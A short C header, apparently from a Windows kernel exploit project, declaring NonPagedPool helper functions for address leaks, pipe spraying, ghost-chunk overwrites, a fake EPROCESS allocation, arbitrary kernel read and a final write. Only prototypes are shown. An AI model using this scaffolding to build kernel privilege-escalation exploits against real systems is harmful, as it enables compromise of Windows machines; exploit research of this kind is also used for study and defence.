#ifndef NONPAGEDPOOL_UTILS_H
#define NONPAGEDPOOL_UTILS_H

#include "exploit.h"
#include "pipe_utils.h"

int npp_get_leak(xploit_t * xploit, pipe_spray_t * respray);
void npp_setup_ghost_overwrite(xploit_t * xploit, char * ghost_overwrite_buf);
void npp_alloc_ghost_chunk(xploit_t * xploit, char * buffer);
void npp_alloc_fake_eprocess(xploit_t * xploit, char * fake_eprocess_buf);
void npp_exploit_arbitrary_read(xploit_t * xploit, uintptr_t where, char * out, size_t size);
void npp_free_ghost_chunk(xploit_t * xploit);
void npp_setup_final_write(xploit_t * xploit, char * buffer);
uintptr_t npp_find_file_object(xploit_t * xploit);

#endif